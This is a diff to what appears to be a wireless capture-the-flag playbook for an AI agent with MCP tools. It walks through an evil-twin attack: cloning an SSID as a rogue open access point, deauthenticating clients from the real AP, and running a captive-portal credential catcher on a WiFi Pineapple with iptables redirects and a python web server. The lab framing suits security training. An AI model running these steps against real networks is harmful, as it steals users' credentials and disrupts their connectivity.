@@ -23,18 +23,35 @@ You stand up your own captive portal on a rogue AP alongside the
 target. Victim clients associate to you, hit your portal, type
 credentials — those credentials are the flag.
 
-```
+MCP tools available: `do_create_rogue_ap`, `do_deauth`. **Not in
+`src/`:** `serve_captive_portal` — drive nodogsplash / apache /
+python http.server on the Pineapple over SSH instead.
+
+```python
 # 1. Clone the target SSID.
 do_create_rogue_ap(ssid="WCTF-Public", channel=6, security="open",
                    i_own_the_airspace=True)
 # 2. Bring up a captive portal that templates the target vendor's
-#    login page.
-serve_captive_portal(handle=<rogue-handle>, template="basic")
+#    login page (fallback shell — see below).
 # 3. Deauth clients off the real AP so they reassociate to you.
-do_deauth(bssid=<target-bssid>, count=10,
+do_deauth(bssid="<target-bssid>", count=10,
           i_own_the_airspace=True)
 # 4. Watch the credential log.
-tail -f /tmp/portal-creds.log
+# tail -f /tmp/portal-creds.log
+```
+
+**Fallback shell chain — captive portal (steps 2 + 4):**
+
+```bash
+# On the Pineapple over SSH — nodogsplash is the classic option
+sudo /etc/init.d/nodogsplash start
+tail -f /tmp/nodogsplash/ndsctl.log
+
+# Or a minimal python cred-catcher:
+sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 \
+    -j REDIRECT --to-port 8080
+sudo python3 -m http.server 8080 --directory /root/portal &
+# Any POST body is logged; wrap in a real script to persist creds.
 ```
 
 ## Signs a portal IS a trap (defender view)
